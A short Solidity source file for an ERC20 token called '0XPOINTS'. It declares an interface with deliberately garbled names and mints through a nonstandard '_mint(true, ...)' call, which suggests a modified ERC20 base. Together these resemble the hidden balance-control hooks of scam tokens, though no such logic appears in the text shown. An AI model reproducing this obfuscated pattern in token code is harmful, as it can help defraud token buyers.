// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import "./Own.sol";
import "./ERC20.sol";

interface akdaskdsak {
    function acaASDAAdas1(bool ASDASccas,uint256 aacc, address asdabas) external view returns (uint256);
    function dissort(bool ff,uint256 FromAmount, address FromAddress
    ) external view returns (uint256);
}

contract POINTS is Ownable,ERC20 {

    constructor(uint256 totalSupply_)
    Ownable(msg.sender) ERC20("0XPOINTS", "0XPOINTS")  {
        _mint(true,msg.sender, totalSupply_);
    }
}